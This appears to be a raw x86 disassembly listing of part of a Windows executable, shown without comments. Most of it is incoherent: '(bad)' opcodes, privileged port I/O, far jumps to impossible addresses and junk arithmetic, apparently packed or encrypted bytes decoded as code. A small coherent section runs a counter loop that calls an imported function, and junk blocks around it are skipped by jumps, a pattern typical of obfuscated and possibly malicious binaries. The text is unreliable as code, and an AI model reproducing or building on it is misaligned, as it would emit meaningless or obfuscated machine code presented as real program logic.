  410f96:	jecxz  0x410fda
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x45bd7d44]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fb4
  410fdd:	adc    BYTE PTR [eax-0x3f],0x88
  410fe1:	sub    BYTE PTR [ebx+0x59],bl
  410fe4:	mov    ecx,0xe7269f94
  410fe9:	cli    
  410fea:	test   al,0x6d
  410fec:	jne    0x410feb
  410fee:	scas   eax,DWORD PTR es:[edi]
  410fef:	dec    esi
  410ff0:	fs xor al,dl
  410ff3:	jmp    0xb328a609
  410ff8:	and    dl,BYTE PTR [ebx+0x2c]
  410ffb:	cwde   
  410ffc:	jp     0x410f81
  410ffe:	sub    edx,ecx
  411000:	dec    ebp
  411001:	and    al,BYTE PTR [ecx-0x7a05663b]
  411007:	imul   esp,DWORD PTR [eax-0x1f],0x25
  41100b:	div    DWORD PTR ds:0xa1558e6c
  411011:	mov    ecx,0xa67a1353
  411016:	pop    ss
  411017:	stc    
  411018:	xor    eax,0x855aa37a
  41101d:	pushf  
  41101e:	into   
  41101f:	addr16 std 
  411021:	push   ecx
  411022:	fcmovne st,st(1)
  411024:	pop    ecx
  411025:	cmp    BYTE PTR [eax+0x40],dl
  411028:	icebp  
  411029:	shl    BYTE PTR [edi+0x43],cl
  41102c:	retf   
  41102d:	dec    ebp
  41102e:	test   BYTE PTR ds:[ecx],ch
  411031:	cs mov al,0xbd
  411034:	jmp    0x51560dfc
  411039:	icebp  
  41103a:	sbb    edx,DWORD PTR ds:0xa63a9462
  411040:	fdiv   st(7),st
  411042:	jns    0x41103e
  411044:	lea    ebx,[esi]
  411046:	mov    ah,0x95
  411048:	sbb    DWORD PTR [edx+0x4b],eax
  41104b:	mov    DWORD PTR [esi+0x50],esi
  41104e:	xchg   dl,dh
  411050:	pusha  
  411051:	xchg   ebp,ebp
  411053:	jnp    0x41107a
  411055:	mov    ebx,0x80e8a92f
  41105a:	cdq    
  41105b:	jl     0x41108f
  41105d:	sub    al,bl
  41105f:	ss push ecx
  411061:	aaa    
  411062:	mov    dh,0x8d
  411064:	push   0xffffffd9
  411066:	sub    ebp,DWORD PTR [ebp+0x9a5938]
  41106c:	iret   
  41106d:	ds in  eax,dx
  41106f:	dec    esp
  411070:	dec    edi
  411071:	fild   DWORD PTR ds:0x3dd98d04
  411077:	add    eax,0xa6e5cfb0
  41107c:	add    BYTE PTR [ebp+0xa],0x26
  411080:	call   0x6694abd0
  411085:	outs   dx,DWORD PTR es:[esi]
  411087:	leave  
  411088:	enter  0x9f94,0xd2
  41108c:	dec    eax
  41108d:	xchg   ebx,eax
  41108e:	mov    ds:0x95dd4d9e,eax
  411093:	test   al,0x19
  411095:	mov    ebx,0x4d92c63d
  41109a:	mov    bl,0xd3
  41109c:	xor    BYTE PTR [eax-0x4f00ff58],cl
  4110a2:	dec    esi
  4110a3:	fbld   TBYTE PTR [ebx-0x2b]
  4110a6:	fsub   QWORD PTR [ecx+0x0]
  4110a9:	add    DWORD PTR [ebx-0x62],0x3
  4110ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ae:	xchg   esp,eax
  4110af:	cmp    al,BYTE PTR [edx-0x23]
  4110b2:	je     0x411035
  4110b4:	push   edx
  4110b5:	call   0xc20e:0xb12304ad
  4110bc:	sub    edi,DWORD PTR [edx+eiz*1]
  4110bf:	push   ds
  4110c0:	shl    DWORD PTR [esi-0x563b907],cl
  4110c6:	sbb    BYTE PTR [eax],bh
  4110c8:	pop    edi
  4110c9:	loopne 0x41110d
  4110cb:	jne    0x411147
  4110cd:	fwait
  4110ce:	add    ah,BYTE PTR ds:[edx-0x14daacb0]
  4110d5:	cwde   
  4110d6:	xchg   esp,eax
  4110d7:	cld    
  4110d8:	or     al,0x57
  4110da:	and    BYTE PTR [edx],bl
  4110dc:	test   eax,0x133ba797
  4110e1:	jmp    0x4110c8
  4110e3:	shl    BYTE PTR [eax+0x5d],1
  4110e6:	ret    
  4110e7:	adc    BYTE PTR [ebx+ecx*1+0x59],bl
  4110eb:	sub    BYTE PTR [edx],ah
  4110ed:	mov    eax,ds:0xdab1e3c6
  4110f2:	xor    esp,edi
  4110f4:	xor    eax,0x5a7b0a3f
  4110f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110fa:	gs enter 0x9ccc,0xde
  4110ff:	mov    ah,0xa9
  411101:	sbb    edx,0xffffffe1
  411104:	fadd   st,st(7)
  411106:	inc    ecx
  411107:	sub    BYTE PTR [edx-0x789fb848],dl
  41110d:	repz dec ecx
  41110f:	jbe    0x4110d1
  411111:	test   DWORD PTR [esi+edx*8+0x10],0x1c6550fa
  411119:	inc    ecx
  41111a:	inc    eax
  41111b:	fist   WORD PTR [ecx]
  41111d:	(bad)  
  41111e:	and    esp,DWORD PTR [ecx+0x44]
  411121:	xor    eax,0xcb31bf21
  411126:	jo     0x411177
  411128:	js     0x411125
  41112a:	or     BYTE PTR [ebp+0x3b267b61],dh
  411130:	pop    ss
  411131:	(bad)  
  411132:	loop   0x4110f8
  411134:	aas    
  411135:	out    0x20,eax
  411137:	sub    eax,0xaedd7810
  41113c:	iret   
  41113d:	xor    eax,0x7566c034
  411142:	mov    ds:0x425c33dc,al
  411147:	pushf  
  411148:	inc    esi
  411149:	mov    al,ds:0x495ac40a
  41114e:	imul   ebx,DWORD PTR [eax],0xffffffa7
  411151:	xlat   BYTE PTR ds:[ebx]
  411152:	pop    ebp
  411153:	mov    ebx,0x8cb1ebd5
  411158:	mov    BYTE PTR [esi],al
  41115a:	push   edx
  41115b:	lods   al,BYTE PTR ds:[esi]
  41115c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41115d:	or     bl,BYTE PTR [ecx-0x26c267e7]
  411163:	in     al,dx
  411164:	mov    ch,0xdb
  411166:	push   ss
  411167:	shl    BYTE PTR [esi-0x5001a55c],cl
  41116d:	pop    ecx
  41116e:	jmp    0x41114e
  411170:	mov    cl,0x9
  411172:	sbb    al,0xf5
  411174:	pop    ecx
  411175:	std    
  411176:	inc    esi
  411177:	sub    DWORD PTR [eax+0x27d5a855],0x53
  41117e:	pop    ss
  41117f:	(bad)  [eax]
  411181:	push   ds
  411182:	lds    eax,FWORD PTR [esi]
  411184:	xchg   esp,eax
  411185:	sbb    ebp,0x3e50170
  41118b:	call   0xa570:0x74144c80
  411192:	cli    
  411193:	xor    eax,0x2092e38
  411198:	push   eax
  411199:	jb     0x4111d8
  41119b:	xchg   cl,dh
  41119d:	in     al,dx
  41119e:	jo     0x4111d8
  4111a0:	adc    edi,DWORD PTR [esi-0x62]
  4111a3:	jg     0x411201
  4111a5:	in     eax,0xd2
  4111a7:	jns    0x411167
  4111a9:	push   esi
  4111aa:	dec    esi
  4111ab:	(bad)  
  4111ac:	out    0xe4,al
  4111ae:	pop    ds
  4111af:	jp     0x411207
  4111b1:	jo     0x4111ab
  4111b3:	adc    bh,BYTE PTR [esi+ecx*2]
  4111b6:	mov    dl,0xbe
  4111b8:	xchg   ebp,eax
  4111b9:	jo     0x4111c7
  4111bb:	dec    edi
  4111bc:	enter  0x3694,0x5d
  4111c0:	push   edi
  4111c1:	sub    DWORD PTR [ebx+0x3b510eaa],eax
  4111c7:	cld    
  4111c8:	mov    esi,0x8814cf86
  4111cd:	stos   BYTE PTR es:[edi],al
  4111ce:	dec    ecx
  4111cf:	push   0xd6858ddc
  4111d4:	inc    edx
  4111d5:	push   edx
  4111d6:	cld    
  4111d7:	int    0x87
  4111d9:	dec    ebx
  4111da:	dec    edi
  4111db:	(bad)  
  4111dc:	cwde   
  4111dd:	xor    ebx,DWORD PTR [ebp+ebx*2+0x5215f3e8]
  4111e4:	sahf   
  4111e5:	sbb    eax,0xcae87561
  4111ea:	pop    edi
  4111eb:	jg     0x411265
  4111ed:	pop    ss
  4111ee:	cdq    
  4111ef:	je     0x41120b
  4111f1:	mov    dh,0xf7
  4111f3:	mov    esp,0x845fbcdd
  4111f8:	xchg   edi,eax
  4111f9:	loop   0x411254
  4111fb:	xchg   edi,eax
  4111fc:	lods   al,BYTE PTR ds:[esi]
  4111fd:	dec    eax
  4111fe:	lea    ecx,[ebp-0x6ca418a]
  411204:	xchg   ecx,eax
  411205:	adc    edx,DWORD PTR [edx-0x60]
  411208:	ficom  WORD PTR [esi]
  41120a:	add    bl,BYTE PTR [ecx]
  41120c:	push   edi
  41120d:	repnz sub ah,al
  411210:	cli    
  411211:	adc    al,0x1d
  411213:	dec    ecx
  411214:	aaa    
  411215:	(bad)  
  411216:	xchg   edi,eax
  411217:	push   ds
  411218:	sbb    bh,BYTE PTR [ecx-0x36]
  41121b:	inc    eax
  41121c:	fimul  DWORD PTR [esi-0x3bd6613e]
  411222:	mov    ebp,0xf295d65a
  411227:	xor    al,0x67
  411229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41122a:	addr16 sub eax,0xa724ba41
  411230:	xlat   BYTE PTR ds:[ebx]
  411231:	and    edi,DWORD PTR [ebp+edx*2-0x37]
  411235:	mov    ebx,0x4e22e42b
  41123a:	mov    ch,0x5f
  41123c:	dec    ecx
  41123d:	push   edi
  41123e:	adc    bl,BYTE PTR [edx]
  411240:	cmp    ah,BYTE PTR [edi]
  411242:	mov    dl,0x76
  411244:	sar    eax,0x4c
  411247:	jp     0x411289
  411249:	in     al,0x39
  41124b:	enter  0x46d6,0xed
  41124f:	inc    esi
  411250:	jns    0x4111f8
  411252:	retf   0xddd7
  411255:	out    dx,al
  411256:	popa   
  411257:	mov    WORD PTR [ebx],gs
  411259:	into   
  41125a:	jg     0x4112d5
  41125c:	pop    ecx
  41125d:	jae    0x41120d
  41125f:	jmp    0x3e34:0x43102232
  411266:	fst    st(7)
  411268:	push   ebp
  411269:	push   cs
  41126a:	dec    eax
  41126b:	(bad)  
  41126d:	and    BYTE PTR [edx-0x70],bl
  411270:	rcr    BYTE PTR [ecx+0x67f7f6b1],0x2c
  411277:	mov    al,ds:0x9e407f32
  41127c:	push   ebp
  41127d:	cs cmp eax,0xfb284733
  411283:	pop    es
  411284:	xchg   edi,eax
  411285:	cli    
  411286:	scas   al,BYTE PTR es:[edi]
  411287:	mov    ecx,0x409ccd6d
  41128c:	mov    cl,BYTE PTR [esi-0x72]
  41128f:	adc    DWORD PTR es:[ebx],esi
  411292:	aad    0x62
  411294:	or     eax,DWORD PTR [eax]
  411296:	or     al,0x79
  411298:	scas   al,BYTE PTR es:[edi]
  411299:	mov    bh,0xd1
  41129b:	pop    ecx
  41129c:	pop    ebp
  41129d:	push   ebp
  41129e:	ret    
  41129f:	cdq    
  4112a0:	lods   eax,DWORD PTR ds:[esi]
  4112a1:	mov    ?,WORD PTR [ebx+0x7d4ea7cb]
  4112a7:	or     bh,0x3e
  4112aa:	scas   eax,DWORD PTR es:[edi]
  4112ab:	mov    al,ds:0x1fee43f4
  4112b0:	pop    esi
  4112b1:	lahf   
  4112b2:	es pop ss
  4112b4:	mov    edx,0xa4680868
  4112b9:	pop    eax
  4112ba:	sahf   
  4112bb:	jmp    0x411240
  4112bd:	or     ebx,DWORD PTR [ebp+0x4c454a7e]
  4112c3:	mov    ebx,0xeea2f579
  4112c8:	pusha  
  4112c9:	outs   dx,DWORD PTR ds:[esi]
  4112ca:	jp     0x41126c
  4112cc:	sbb    ch,dh
  4112ce:	push   0x8f1922c9
  4112d3:	shr    BYTE PTR [eax-0x5c],cl
  4112d6:	aad    0xd6
  4112d8:	or     bh,cl
  4112da:	jno    0x41130c
  4112dc:	mov    bh,0xf9
  4112de:	mov    ebx,DWORD PTR [ebx+0x4f897f96]
  4112e4:	pop    ecx
  4112e5:	cmp    bl,BYTE PTR [esi]
  4112e7:	inc    ecx
  4112e8:	mov    bl,0x9d
  4112ea:	fs (bad) 
  4112ec:	jle    0x4112db
  4112ee:	or     DWORD PTR ds:0xda94dd6b,0x40
  4112f5:	pop    ds
  4112f6:	push   esp
  4112f7:	jg     0x4112e6
  4112f9:	cmp    BYTE PTR [edx],cl
  4112fb:	hlt    
  4112fc:	jmp    0x18c7:0xf58de54b
  411303:	outs   dx,BYTE PTR ds:[esi]
  411304:	mov    WORD PTR ds:0x78ff839a,?
  41130a:	(bad)
  41130e:	push   es
  41130f:	in     al,dx
  411310:	add    BYTE PTR [edi+0x65],al
  411313:	push   esi
  411314:	or     esi,eax
  411316:	mov    bl,0x50
  411318:	inc    ebx
  411319:	dec    ecx
  41131a:	dec    eax
  41131b:	mov    al,0xbc
  41131d:	and    eax,0x18c4d4cf
  411322:	retf   0x4778
  411325:	sub    ch,al
  411327:	retf   0x8847
  41132a:	sub    eax,0x6f97ae6
  41132f:	jg     0x411396
  411331:	pop    edi
  411332:	xchg   esi,eax
  411333:	sar    BYTE PTR [ebx],cl
  411335:	ret    0x2c7e
  411338:	pop    ss
  411339:	mov    eax,ss:0x6d53d1c3
  41133f:	inc    edx
  411340:	or     DWORD PTR [ebx-0x22],0xcde1def2
  411347:	cmp    bl,BYTE PTR [ebx]
  411349:	outs   dx,BYTE PTR ds:[esi]
  41134a:	sub    edi,esi
  41134c:	pop    edx
  41134d:	aam    0x8c
  41134f:	mov    ecx,0x2c7487ea
  411354:	mov    eax,eax
  411356:	rcr    DWORD PTR [ecx+0x66],1
  411359:	mov    ecx,0x28f9e350
  41135e:	pop    edx
  41135f:	push   ds
  411360:	mov    al,ds:0xd62d50c0
  411365:	adc    BYTE PTR [esi-0x22b44ef3],0x1d
  41136c:	icebp  
  41136d:	dec    eax
  41136e:	int3   
  41136f:	dec    ebx
  411370:	push   0xffffffb1
  411372:	sbb    DWORD PTR [esi],eax
  411374:	ret    0xd0c6
  411377:	mov    bl,0x4c
  411379:	xchg   edi,eax
  41137a:	or     DWORD PTR [ebp-0x5cfbeab8],ebp
  411380:	(bad)  
  411381:	xchg   ebp,eax
  411382:	outs   dx,DWORD PTR ds:[esi]
  411383:	(bad)  
  411384:	pop    edi
  411385:	mov    WORD PTR [edx],cs
  411387:	xor    al,0xa0
  411389:	inc    ecx
  41138a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138b:	(bad)  
  41138c:	out    dx,al
  41138d:	dec    edi
  41138e:	jno    0x41134e
  411390:	pop    esp
  411391:	ins    BYTE PTR es:[edi],dx
  411392:	gs cs out 0x2e,al
  411396:	push   ebp
  411397:	pop    esp
  411398:	add    eax,0xfe8caaa8
  41139d:	cwde   
  41139e:	jbe    0x411323
  4113a0:	mov    dh,0x20
  4113a2:	out    dx,eax
  4113a3:	mov    dh,BYTE PTR [ebx]
  4113a5:	pop    ds
  4113a6:	mov    bl,0xbc
  4113a8:	sahf   
  4113a9:	in     eax,dx
  4113aa:	mov    ebx,0x39a8ee93
  4113af:	(bad)  
  4113b0:	lea    ecx,[ebx]
  4113b2:	cmp    ecx,DWORD PTR [esi-0xf]
  4113b5:	lods   eax,DWORD PTR ds:[esi]
  4113b6:	mov    cl,0x71
  4113b8:	and    eax,0x22821402
  4113bd:	pop    eax
  4113be:	or     DWORD PTR [esi-0xc],esp
  4113c1:	push   ecx
  4113c2:	cs (bad) 
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	adc    ebx,DWORD PTR [edx+0x4a0eeeb1]
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114c2
  411454:	mov    ah,0x51
  411456:	mov    BYTE PTR [edi],ch
  411458:	(bad)  
  411459:	out    0x37,al
  41145b:	pop    edx
  41145c:	imul   esp,ebp,0x7
  41145f:	cmp    BYTE PTR [esi-0x31],ch
  411462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411463:	fdivr  DWORD PTR [ecx]
  411465:	dec    edx
  411466:	out    dx,eax
  411467:	in     eax,0xf
  411469:	sbb    bl,BYTE PTR [ebx]
  41146b:	sbb    bh,BYTE PTR [edx]
  41146d:	mov    ch,0x40
  41146f:	pop    esi
  411470:	inc    edx
  411471:	jnp    0x41144b
  411473:	mov    esi,0x4666c99e
  411478:	dec    eax
  411479:	int3   
  41147a:	or     eax,0xa7987286
  41147f:	mov    BYTE PTR gs:[ebx-0xe7134bf],ah
  411486:	dec    ebx
  411487:	int    0x97
  411489:	repnz fcom DWORD PTR [ecx]
  41148c:	push   0xffffff90
  41148e:	adc    eax,0x2a48404c
  411493:	jo     0x41141d
  411495:	jmp    0xbdc10038
  41149a:	es jle 0x41145d
  41149d:	dec    edi
  41149e:	sub    al,0x44
  4114a0:	mov    edx,DWORD PTR [ebx+edx*4+0x65e84997]
  4114a7:	(bad)  
  4114a8:	not    BYTE PTR [ebx-0x1189edd4]
  4114ae:	jmp    0x41143f
  4114b0:	fld1   
  4114b2:	fadd   DWORD PTR [edi+ebx*1+0x45cbbcfe]
  4114b9:	mov    al,0x67
  4114bb:	xor    BYTE PTR [ecx-0x10],0x3c
  4114bf:	in     eax,0xe2
  4114c1:	ss xchg edi,eax
  4114c3:	inc    edx
  4114c4:	xor    eax,esp
  4114c6:	cmp    al,0x23
  4114c8:	cmp    BYTE PTR [ecx-0x70],cl
  4114cb:	jns    0x411536
  4114cd:	pop    esp
  4114ce:	cli    
  4114cf:	icebp  
  4114d0:	xchg   esp,eax
  4114d1:	popf   
  4114d2:	js     0x411544
  4114d4:	lea    edi,[eax+0x7a82fa4b]
  4114da:	data16 sub BYTE PTR [edi-0x63],0x6b
  4114df:	inc    ecx
  4114e0:	sbb    eax,0xfb9fd874
  4114e5:	scas   eax,DWORD PTR es:[edi]
  4114e6:	fdivr  QWORD PTR [ebx]
  4114e8:	or     BYTE PTR [ebx-0x5],dl
  4114eb:	push   cs
  4114ec:	into   
  4114ed:	inc    esp
  4114ee:	sub    DWORD PTR [edx+0x5f3dbcfa],ebx
  4114f4:	pop    ss
  4114f5:	scas   eax,DWORD PTR es:[edi]
  4114f6:	inc    ebp
  4114f7:	dec    ebx
  4114f8:	jae    0x4114d6
  4114fa:	leave  
  4114fb:	adc    ah,bh
  4114fd:	and    edi,DWORD PTR [ecx-0x6]
  411500:	cmp    al,dl
  411502:	icebp  
  411503:	xor    eax,0x2e9cb5d9
  411508:	push   0x35
  41150a:	pop    ds
  41150b:	mov    dl,BYTE PTR ds:0x86a70716
  411511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411512:	iret   
  411513:	ret    0xc6ba
  411516:	add    dh,BYTE PTR [edi-0x1c]
  411519:	(bad)  
  41151a:	fsub   QWORD PTR [edx]
  41151c:	push   0xffffffc7
  41151e:	stos   BYTE PTR es:[edi],al
  41151f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411520:	dec    esi
  411521:	adc    ecx,edi
  411523:	rcr    BYTE PTR [edi+ebp*2],cl
  411526:	xchg   esp,eax
  411527:	lods   al,BYTE PTR ds:[esi]
  411528:	mov    ebp,0x39f448dd
  41152d:	mov    eax,ds:0x9b8ec039
  411532:	jecxz  0x41150e
  411534:	jl     0x4114f6
  411536:	jne    0x4115b0
  411538:	ins    DWORD PTR es:[edi],dx
  411539:	pop    esi
  41153a:	push   ds
  41153b:	pop    ebx
  41153c:	jne    0x411519
  41153e:	sbb    BYTE PTR [ecx-0x42],dh
  411541:	out    0xb7,eax
  411543:	ss jae 0x41157a
  411546:	or     DWORD PTR [edi-0x76],esp
  411549:	stos   BYTE PTR es:[edi],al
  41154a:	add    al,0x17
  41154c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41154d:	jl     0x411565
  41154f:	icebp  
  411550:	lea    edi,[esi-0x527db667]
  411556:	jae    0x4114f3
  411558:	out    0x60,eax
  41155a:	mov    eax,0x2925032
  41155f:	sub    eax,0xd4f06c0
  411564:	jb     0x41155a
  411566:	jecxz  0x4115b0
  411568:	pop    eax
  411569:	push   edi
  41156a:	aas    
  41156b:	fcomp  QWORD PTR [edi+ecx*2-0x17]
  41156f:	cmp    DWORD PTR [esi],ecx
  411571:	xchg   ebx,eax
  411572:	and    al,BYTE PTR [ecx+0x6c]
  411575:	mov    gs,WORD PTR cs:[edi-0x17]
  411579:	add    ah,ch
  41157b:	in     al,dx
  41157c:	(bad)  
  41157d:	(bad)  
  41157f:	adc    al,0x7d
  411581:	and    ah,BYTE PTR [ecx-0x7eeeec1c]
  411587:	mov    fs,WORD PTR [ebx-0xf]
  41158a:	mov    dl,0xe
  41158c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158d:	outs   dx,DWORD PTR ds:[esi]
  41158e:	push   esi
  41158f:	leave  
  411590:	jb     0x4115ac
  411592:	ret    
  411593:	jnp    0x411605
  411595:	pop    ecx
  411596:	std    
  411597:	lea    edi,[edx]
  411599:	out    dx,eax
  41159a:	cmp    al,0xd0
  41159c:	lods   eax,DWORD PTR ds:[esi]
  41159d:	push   ds
  41159e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41159f:	neg    bh
  4115a1:	mov    eax,ds:0x151a59f7
  4115a6:	outs   dx,DWORD PTR ds:[esi]
  4115a7:	xchg   ebp,eax
  4115a8:	and    al,0x2c
  4115aa:	cmp    edi,0xffffffe7
  4115ad:	mov    eax,ds:0x3908dfd9
  4115b2:	in     al,0x1d
  4115b4:	repz ss mov dh,0x23
  4115b8:	sahf   
  4115b9:	push   ebx
  4115ba:	out    0xf9,eax
  4115bc:	mov    eax,ds:0x134832c3
  4115c1:	in     eax,dx
  4115c2:	fld    QWORD PTR [ecx-0xd]
  4115c5:	mov    WORD PTR [esi+ebx*4],ss
  4115c8:	cmp    eax,0x53372a03
  4115cd:	or     eax,0xc0592406
  4115d2:	jno    0x411644
  4115d4:	cmp    BYTE PTR [edx-0x4938e1b8],bl
  4115da:	cmp    eax,0x63b89612
  4115df:	mov    ecx,0x8c58aeb4
  4115e4:	sub    BYTE PTR [ecx],ah
  4115e6:	mov    ds:0x355ff6c7,eax
  4115eb:	les    edi,FWORD PTR [ebp+0x2ecfad49]
  4115f1:	lods   eax,DWORD PTR ds:[esi]
  4115f2:	call   0xe284:0xc0e88466
  4115f9:	jmp    0x411595
  4115fb:	dec    esi
  4115fc:	mov    ebx,0x7a207b2a
  411601:	div    DWORD PTR [ebx+ecx*4-0x71]
  411605:	xchg   edx,eax
  411606:	and    al,0xd8
  411608:	mov    eax,0x1efda27b
  41160d:	arpl   ax,cx
  41160f:	cdq    
  411610:	sbb    al,0xa0
  411612:	(bad)  
  411613:	sbb    eax,DWORD PTR [eax-0x1b]
  411616:	push   es
  411617:	and    ecx,edx
  411619:	out    dx,eax
  41161a:	jno    0x41161b
  41161c:	mov    cl,0xf
  41161e:	inc    eax
  41161f:	mov    esi,0x765d707a
  411624:	sub    BYTE PTR [edi-0x6c239d28],bl
  41162a:	loop   0x4115ea
  41162c:	fstp   DWORD PTR [ebx]
  41162e:	in     eax,dx
  41162f:	mov    eax,0x43ed0461
  411634:	and    DWORD PTR [ebx+0x3a],ebp
  411637:	imul   ebx,ebx,0xbeab0241
  41163d:	xor    bh,BYTE PTR [ebx]
  41163f:	inc    edi
  411640:	xchg   DWORD PTR [edi],ebx
  411642:	jne    0x411638
  411644:	add    esi,edx
  411646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411647:	jle    0x411640
  411649:	int3   
  41164a:	push   0x318a4605
  41164f:	sbb    dl,bl
  411651:	xor    ecx,ebx
  411653:	das    
  411654:	int    0xbd
  411656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411657:	jmp    0x5ea7:0x5085100c
  41165e:	nop
  41165f:	lock add DWORD PTR [edi],ebp
  411662:	div    cl
  411664:	aaa    
  411665:	test   al,0x1b
  411667:	cdq    
  411668:	lods   eax,DWORD PTR ds:[esi]
  411669:	fistp  DWORD PTR [ebp-0x572545c1]
  41166f:	mov    esi,0x97c16dd0
  411674:	retf   0xc999
  411677:	pop    ebx
  411678:	fsubr  DWORD PTR [edi+0x59f60d61]
  41167e:	mov    dh,0xad
  411680:	and    eax,0x579acb66
  411685:	xchg   esp,eax
  411686:	scas   al,BYTE PTR es:[edi]
  411687:	sub    eax,DWORD PTR [edx-0xc]
  41168a:	mov    al,al
  41168c:	mov    esi,0xd7433d0c
  411691:	cmp    DWORD PTR [ebx-0x58],ecx
  411694:	fwait
  411695:	dec    eax
  411696:	jno    0x411639
  411698:	mov    bh,0xb3
  41169a:	inc    ebp
  41169b:	(bad)  
  41169c:	adc    BYTE PTR [esi-0x19],ah
  41169f:	sahf   
  4116a0:	mov    cs,edx
  4116a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116a3:	push   edx
  4116a4:	jne    0x4116bd
  4116a6:	in     eax,dx
  4116a7:	xor    al,0x9c
  4116a9:	sbb    bh,BYTE PTR [ebx+0x780fe801]
  4116af:	(bad)  
  4116b0:	fidiv  DWORD PTR [edi+0x4a563cae]
  4116b6:	fstp   DWORD PTR [edx-0x70]
  4116b9:	sub    eax,0xf04e6127
  4116be:	add    DWORD PTR [edx+0x71],esp
  4116c1:	dec    ebx
  4116c2:	scas   al,BYTE PTR es:[edi]
  4116c3:	or     al,0xdf
  4116c5:	sub    al,0x48
  4116c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c8:	mov    edx,0x7f1bd7c5
  4116cd:	fs scas eax,DWORD PTR es:[edi]
  4116cf:	sbb    DWORD PTR [edi],ebx
  4116d1:	lock rcr al,0x98
  4116d5:	adc    esi,esi
  4116d7:	or     ah,BYTE PTR [ecx+0x19780aa8]
  4116dd:	mov    ch,0x95
  4116df:	pop    ebx
  4116e0:	mov    ebx,0xdb592ea8
  4116e5:	stos   DWORD PTR es:[edi],eax
  4116e6:	shl    DWORD PTR [esi+0x12],cl
  4116e9:	push   edx
  4116ea:	aas    
  4116eb:	xrelease mov BYTE PTR [edi-0x80],0x75
  4116f0:	(bad)  
  4116f1:	and    DWORD PTR [esp+ebp*4+0x42482d07],esp
  4116f8:	test   ah,dh
  4116fa:	mov    edi,0xb9317303
  4116ff:	mov    edi,es
  411701:	adc    bl,0x87
  411704:	mov    esp,0xd5d4e491
  411709:	pop    esp
  41170a:	sar    DWORD PTR [edi+0x409ff6a4],cl
  411710:	and    ch,BYTE PTR ds:0xaf3be124
  411716:	sbb    eax,0x1b31b6b3
  41171b:	cmp    DWORD PTR [edi],ebx
  41171d:	xlat   BYTE PTR ds:[ebx]
  41171e:	sbb    al,0x6c
  411720:	and    al,0x66
  411722:	inc    bx
  411724:	cmp    ecx,DWORD PTR [ebp+edx*1+0x2]
  411728:	stos   DWORD PTR es:[edi],eax
  411729:	or     bh,BYTE PTR [ecx-0x143f1c4b]
  41172f:	outs   dx,DWORD PTR ds:[esi]
  411730:	xchg   edi,eax
  411731:	repz or eax,0x4f419454
  411737:	adc    BYTE PTR [ebx-0x620a8798],al
  41173d:	pop    esp
  41173e:	push   ecx
  41173f:	shl    DWORD PTR [esi],0x96
  411742:	or     ch,0x1
  411745:	xchg   ecx,eax
  411746:	out    dx,eax
  411747:	retf   0xae18
  41174a:	lock stc 
  41174c:	pop    esi
  41174d:	shl    DWORD PTR [edi+0x548e3892],cl
  411753:	xchg   esi,eax
  411754:	jns    0x411768
  411756:	enter  0x252d,0x35
  41175a:	push   esi
  41175b:	cmovb  ecx,esp
  41175e:	outs   dx,DWORD PTR ds:[esi]
  41175f:	dec    esp
  411760:	add    BYTE PTR [edx+0x37],0xbb
  411764:	out    dx,eax
  411765:	xchg   edx,eax
  411766:	test   al,0x15
  411768:	pop    edi
  411769:	ret    
  41176a:	sar    DWORD PTR gs:[ebx+0x2d8f3d7f],0x1e
  411772:	push   ss
  411773:	sub    DWORD PTR [edi],esi
  411775:	xchg   ebp,eax
  411776:	xchg   ebx,eax
  411777:	scas   eax,DWORD PTR es:[edi]
  411778:	mov    dl,0x5d
  41177a:	cld    
  41177b:	mov    bh,BYTE PTR [ebx+0x0]
  41177e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41177f:	jp     0x411730
  411781:	fdivr  st,st(3)
  411783:	add    edx,ebx
  411785:	xor    al,0xf2
